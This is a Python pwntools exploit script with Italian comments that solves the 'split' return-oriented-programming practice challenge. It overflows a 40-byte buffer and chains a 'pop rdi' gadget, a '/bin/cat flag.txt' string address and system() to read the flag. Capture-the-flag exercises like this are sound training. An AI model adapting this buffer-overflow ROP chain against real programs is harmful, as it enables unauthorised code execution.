import sys
from pwn import *
context(arch='amd64', os='linux')



#con pattern create e pattern search possiamo vedere che abbiamo 40 byte prima del registro rsp
buf = b'\x55'*40

#ropper --file split --search "ret;"
ret_offset = p64(0x40053e)

#ropper --file split --search "pop rdi; ret;"
#non mi serve il base address di libc perchÃ¨ lo prendo dal binario direttamente
pop_rdi_address= p64(0x4007c3)



# trovo la string per il pop "/bin/cat flag.txt"
# sempre da ghidra, guardando usefulString
str_address = p64(0x601060)


#questa la devo prendere con ghidra dal binario, se no non va, vedo usefulFunction
system_address= p64(0x40074b) 







print(pop_rdi_address)
print(str_address)
print(system_address)

p = process('./split')
print(p.recvuntil(b'> '))

#print(buf  + pop_rdi_address + str_address + system_address)
p.sendline(buf  + pop_rdi_address + str_address + system_address)
print(p.recvline())

p.interactive()

